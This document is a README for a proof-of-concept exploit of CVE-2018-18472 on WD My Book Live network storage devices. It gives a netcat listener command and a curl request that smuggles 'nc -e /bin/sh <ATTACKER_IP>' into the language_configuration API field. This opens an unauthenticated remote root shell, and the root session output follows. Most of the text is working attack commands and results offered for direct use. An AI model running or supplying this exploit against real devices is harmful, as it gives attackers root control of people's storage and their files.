# My Book Live reverse shell

This reverse shell PoC is based on **CVE-2018-18472**. Research was done by **WizCase**. Source: <https://iotsecuritynews.com/wizcase-report-vulnerabilities-found-in-wd-my-book-netgear-stora-seagate-home-medion-lifecloud-nas/>

1. Turn on TLSv1.0 support in OpenSSL library: <https://www.maartendekeizer.nl/blog/detail/fix-curl-35-error-1425f102-ssl-routines-ssl_choose_client_version-unsupported-protocol>

2. Start `ncat` listener:

```
nc -lvnp 9999
```
3. Execute REST API calling:

```
curl -k -X PUT -d 'language=en_US`nc -e /bin/sh <ATTACKER_IP> 9999`' https://<VICTIM_IP>/api/1.0/rest/language_configuration
```

4. Enjoy your reverse shell!
```
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from <VICTIM_IP>.
Ncat: Connection from <VICTIM_IP>:51490.
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),1000(share)
uname -a
Linux MyBookLive 2.6.32.11-svn70860 #1 Thu May 17 13:32:51 PDT 2012 ppc GNU/Linux
ls -la /
total 336
drwxr-xr-x  25 root root      4096 Jun 24 04:22 .
drwxr-xr-x  25 root root      4096 Jun 24 04:22 ..
drwxrwxrwx  14 root www-data 65536 Jun 23 21:54 CacheVolume
drwxr-xr-x   6 root root     65536 Jun 14 18:48 DataVolume
drwxr-xr-x   2 root root      4096 May  8  2015 bin
drwxr-xr-x   3 root root      4096 Jun 23 20:44 boot
drwxr-xr-x   2 root root      4096 May  8  2015 debootstrap
drwxr-xr-x  12 root root      2500 Jun 24 04:23 dev
drwxr-xr-x  78 root root      4096 Jun 24 04:24 etc
drwxr-xr-x   3 root root      4096 May  8  2015 home
lrwxrwxrwx   1 root root        24 May  8  2015 led_color -> /usr/local/nas/led_color
drwxr-xr-x  11 root root      4096 May  8  2015 lib
drwx------   2 root root     16384 May  8  2015 lost+found
drwxr-xr-x   2 root root      4096 May  8  2015 media
drwxrwxr-x   8 root share    65536 Jun 23 21:40 nfs
drwxr-xr-x   2 root root      4096 May  8  2015 opt
dr-xr-xr-x 105 root root         0 Jan  1  1970 proc
drwxr-xr-x   5 root root      4096 Jun 23 21:51 root
drwxr-xr-x   2 root root      4096 May  8  2015 sbin
drwxr-xr-x   2 root root      4096 May  8  2015 selinux
drwxrwxr-x   8 root share    65536 Jun 23 21:40 shares
drwxr-xr-x   2 root root      4096 May  8  2015 srv
drwxr-xr-x  12 root root         0 Jan  1  1970 sys
drwxrwxrwt  13 root root      1320 Jun 24 04:50 tmp
drwxr-xr-x  14 root root      4096 May  8  2015 usr
drwxr-xr-x  13 root root      4096 May  8  2015 var

```
